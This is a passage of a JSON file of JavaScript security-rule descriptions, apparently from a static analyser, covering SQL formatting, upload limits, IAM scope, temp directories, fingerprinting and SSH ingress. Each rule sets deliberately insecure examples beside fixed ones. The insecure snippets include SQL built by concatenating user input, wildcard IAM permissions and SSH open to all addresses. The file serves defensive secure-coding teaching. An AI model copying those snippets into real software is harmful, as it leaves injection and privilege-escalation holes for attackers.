href=\"https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html\">AWS Documentation</a> - Encryption of\n  data at rest for Amazon OpenSearch Service </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S5693": {
        "name": "Allowing requests with excessive content length is security-sensitive",
        "htmlDesc": "<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/formidable\">formidable</a> file upload module:</p>\n<pre>\nconst form = new Formidable();\nform.maxFileSize = 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB\n\nconst formDefault = new Formidable(); // Sensitive, the default value is 200MB\n</pre>\n<p><a href=\"https://www.npmjs.com/package/multer\">multer</a> (Express.js middleware) file upload module:</p>\n<pre>\nlet diskUpload = multer({\n  storage: diskStorage,\n  limits: {\n    fileSize: 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB\n  }\n});\n\nlet diskUploadUnlimited = multer({ // Sensitive: the default value is no limit\n  storage: diskStorage,\n});\n</pre>\n<p><a href=\"https://www.npmjs.com/package/body-parser\">body-parser</a> module:</p>\n<pre>\n// 4MB is more than the recommended limit of 2MB for non-file-upload requests\nlet jsonParser = bodyParser.json({ limit: \"4mb\" }); // Sensitive\nlet urlencodedParser = bodyParser.urlencoded({ extended: false, limit: \"4mb\" }); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/formidable\">formidable</a> file upload module:</p>\n<pre>\nconst form = new Formidable();\nform.maxFileSize = 8000000; // Compliant: 8MB\n</pre>\n<p><a href=\"https://www.npmjs.com/package/multer\">multer</a> (Express.js middleware) file upload module:</p>\n<pre>\nlet diskUpload = multer({\n  storage: diskStorage,\n  limits: {\n     fileSize: 8000000 // Compliant: 8MB\n  }\n});\n</pre>\n<p><a href=\"https://www.npmjs.com/package/body-parser\">body-parser</a> module:</p>\n<pre>\nlet jsonParser = bodyParser.json(); // Compliant, when the limit is not defined, the default value is set to 100kb\nlet urlencodedParser = bodyParser.urlencoded({ extended: false, limit: \"2mb\" }); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=javascript%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted\nqueries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === MySQL ===\nconst mysql = require('mysql');\nconst mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });\nmycon.connect(function(err) {\n  mycon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive\n});\n\n// === PostgreSQL ===\nconst pg = require('pg');\nconst pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });\npgcon.connect();\npgcon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// === MySQL ===\nconst mysql = require('mysql');\nconst mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });\nmycon.connect(function(err) {\n  mycon.query('SELECT name FROM users WHERE id = ?', [userinput], (err, res) =&gt; {});\n});\n\n// === PostgreSQL ===\nconst pg = require('pg');\nconst pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });\npgcon.connect();\npgcon.query('SELECT name FROM users WHERE id = $1', [userinput], (err, res) =&gt; {});\n</pre>\n<h2>Exceptions</h2>\n<p>This rule’s current implementation does not follow variables. It will only detect SQL queries which are formatted directly in the function\ncall.</p>\n<pre>\nconst sql = 'SELECT * FROM users WHERE id = ' + userinput;\nmycon.query(sql, (err, res) =&gt; {}); // Sensitive but no issue is raised.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S6317": {
        "name": "AWS IAM policies should limit the scope of permissions given",
        "htmlDesc": "<p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated\nresources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions\nthan expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher\nlevel of access.</p>\n<h2>Why is this an issue?</h2>\n<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy\nwhich, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)\nare called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>\n<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>\"*\"</code> permissions for example.) This is especially\ntrue if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of\npermissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles\nthat have more permissions than they need.</p>\n<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>\n<h3>What is the potential impact?</h3>\n<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be\nable to perform actions beyond their intended scope.</p>\n<h4>Privilege escalation</h4>\n<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be\nable to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>\n<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and\ndelete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to\nexfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe\nconsequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>\n<h2>How to fix it in AWS CDK</h2>\n<h3>Code examples</h3>\n<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by\naltering the code of a Lambda that executes with high privileges.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [new iam.PolicyStatement({\n        effect: iam.Effect.ALLOW,\n        actions: [\"lambda:UpdateFunctionCode\"],\n        resources: [\"*\"], // Noncompliant\n    })],\n});\n</pre>\n<h4>Compliant solution</h4>\n<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [new iam.PolicyStatement({\n        effect: iam.Effect.ALLOW,\n        actions: [\"lambda:UpdateFunctionCode\"],\n        resources: [\"arn:aws:lambda:us-east-2:123456789012:function:my-function:1\"],\n    })],\n});\n</pre>\n<h3>How does this work?</h3>\n<h4>Principle of least privilege</h4>\n<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted\nenough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>\n<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy\nwith overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.\nIn this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv\">Policies and permissions\n  in IAM: Grant least privilege</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Rhino Security Labs - <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\">AWS IAM Privilege Escalation -\n  Methods and Mitigation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-269 - Improper Privilege Management</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst fs = require('fs');\n\nlet tmp_file = \"/tmp/temporary_file\"; // Sensitive\nfs.readFile(tmp_file, 'utf8', function (err, data) {\n  // ...\n});\n</pre>\n<pre>\nconst fs = require('fs');\n\nlet tmp_dir = process.env.TMPDIR; // Sensitive\nfs.readFile(tmp_dir + \"/temporary_file\", 'utf8', function (err, data) {\n  // ...\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5689": {
        "name": "Disclosing fingerprints from web application technologies is security-sensitive",
        "htmlDesc": "<p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a\nsignificant security risk depending on the production environement.</p>\n<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>\n<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit\nknown vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those\nvulnerabilities.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Version information is accessible to end users. </li>\n  <li> Internal systems do not benefit from timely patch management workflows. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying\narchitectures. This is known as the \"need to know\" principle.</p>\n<p>The most effective solution is to remove version information disclosure from what end users can see, such as the \"x-powered-by\" header.<br> This\ncan be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>\n<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that\nthis does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should\nnever be the only defense mechanism and should always be combined with other security measures.</p>\n<h2>Sensitive Code Example</h2>\n<p>In <a href=\"https://www.npmjs.com/package/express\">Express.js</a>, version information is disclosed by default in the <code>x-powered-by</code>\nHTTP header:</p>\n<pre>\nlet express = require('express');\n\nlet example = express(); // Sensitive\n\nexample.get('/', function (req, res) {\n  res.send('example')\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p><code>x-powered-by</code> HTTP header should be disabled in <a href=\"https://www.npmjs.com/package/express\">Express.js</a> with\n<code>app.disable</code>:</p>\n<pre>\nlet express = require('express');\n\nlet example = express();\nexample.disable(\"x-powered-by\");\n</pre>\n<p>Or with helmet’s <a href=\"https://www.npmjs.com/package/helmet\">hidePoweredBy</a> middleware:</p>\n<pre>\nlet helmet = require(\"helmet\");\n\nlet example = express();\nexample.use(helmet.hidePoweredBy());\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html\">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Information Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S6319": {
        "name": "Using unencrypted SageMaker notebook instances is security-sensitive",
        "htmlDesc": "<p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker\ninstances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries\nphysically access the storage media, they cannot decrypt encrypted data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The instance contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by\nSageMaker, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html\"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>\n<pre>\nimport { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';\n\nnew CfnNotebookInstance(this, 'example', {\n      instanceType: 'instanceType',\n      roleArn: 'roleArn'\n}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html\"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>\n<pre>\nimport { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';\n\nconst encryptionKey = new Key(this, 'example', {\n    enableKeyRotation: true,\n});\nnew CfnNotebookInstance(this, 'example', {\n    instanceType: 'instanceType',\n    roleArn: 'roleArn',\n    kmsKeyId: encryptionKey.keyId\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html\">Protect Data at Rest Using Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S5148": {
        "name": "Authorizing an opened window to access back to the originating window is security-sensitive",
        "htmlDesc": "<p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not\n<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>\n<p>For instance, an attacker can put a link (say: \"http://example.com/mylink\") on a popular website that changes, when opened, the original page to\n\"http://example.com/fake_login\". On \"http://example.com/fake_login\" there is a fake login page which could trick real users to enter their\ncredentials.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application opens untrusted external URL. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>\n<p>Note: In Chrome 88+, Firefox 79+ or Safari 12.1+ <code>target=_blank</code> on anchors implies <code>rel=noopener</code> which make the protection\nenabled by default.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nwindow.open(\"https://example.com/dangerous\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nwindow.open(\"https://example.com/dangerous\", \"WindowName\", \"noopener\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\">Reverse Tabnabbing</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1022\">CWE-1022 - Use of Web Link to Untrusted Target with window.opener Access</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://mathiasbynens.github.io/rel-noopener/\">https://mathiasbynens.github.io/rel-noopener/</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S6321": {
        "name": "Administration services access should be restricted to specific IP addresses",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and\noutbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services\ntraditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>\n<h3>What is the potential impact?</h3>\n<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a\nvulnerability could have a high impact on the system.</p>\n<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the\ncredentials to log in to the system.</p>\n<h2>How to fix it</h2>\n<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those\nheld by system administrators or those of <a href=\"https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls\">bastion-like</a>\nservers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and other constructs\nthat support a <code>connections</code> attribute:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst instance = new ec2.Instance(this, \"default-own-security-group\",{\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    instanceName: \"test-instance\"\n})\n\ninstance.connections.allowFrom(\n    ec2.Peer.anyIpv4(), // Noncompliant\n    ec2.Port.tcp(22),\n    /*description*/ \"Allows SSH from all IPv4\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html\">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst securityGroup = new ec2.SecurityGroup(this, \"custom-security-group\", {\n    vpc: vpc\n})\n\nsecurityGroup.addIngressRule(\n    ec2.Peer.anyIpv4(), // Noncompliant\n    ec2.Port.tcpRange(1, 1024)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnSecurityGroup(\n    this,\n    \"cfn-based-security-group\", {\n        groupDescription: \"cfn based security group\",\n        groupName: \"cfn-based-security-group\",\n        vpcId: vpc.vpcId,\n        securityGroupIngress: [\n            {\n                ipProtocol: \"6\",\n                cidrIp: \"0.0.0.0/0\", // Noncompliant\n                fromPort: 22,\n                toPort: 22\n            }\n        ]\n    }\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnSecurityGroupIngress( // Noncompliant\n    this,\n    \"ingress-all-ip-tcp-ssh\", {\n        ipProtocol: \"tcp\",\n        cidrIp: \"0.0.0.0/0\",\n        fromPort: 22,\n        toPort: 22,\n        groupId: securityGroup.attrGroupId\n})\n</pre>\n<h4>Compliant solution</h4>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and other constructs\nthat support a <code>connections</code> attribute:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst instance = new ec2.Instance(this, \"default-own-security-group\",{\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    instanceName: \"test-instance\"\n})\n\ninstance.connections.allowFrom(\n    ec2.Peer.ipv4(\"192.0.2.0/24\"),\n    ec2.Port.tcp(22),\n    /*description*/ \"Allows SSH from a trusted range\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html\">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst securityGroup3 = new ec2.SecurityGroup(this, \"custom-security-group\", {\n    vpc: vpc\n})\n\nsecurityGroup3.addIngressRule(\n    ec2.Peer.anyIpv4(),\n    ec2.Port.tcpRange(1024, 1048)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnSecurityGroup(\n    this,\n    \"cfn-based-security-group\", {\n        groupDescription: \"cfn based security group\",\n        groupName: \"cfn-based-security-group\",\n        vpcId: vpc.vpcId,\n        securityGroupIngress: [\n            {\n                ipProtocol: \"6\",\n                cidrIp: \"192.0.2.0/24\",\n                fromPort: 22,\n                toPort: 22\n            }\n        ]\n    }\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nnew ec2.CfnSecurityGroupIngress(\n    this,\n    \"ingress-all-ipv4-tcp-http\", {\n        ipProtocol: \"6\",\n        cidrIp: \"0.0.0.0/0\",\n        fromPort: 80,\n        toPort: 80,\n        groupId: securityGroup.attrGroupId\n    }\n)\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Security groups for your VPC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview\">Azure Documentation</a> - Network security\n  groups </li>\n  <li> <a href=\"https://cloud.google.com/vpc/docs/using-firewalls\">GCP Documentation</a> - Firewalls </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S6327": {
        "name": "Using unencrypted SNS topics is security-sensitive",
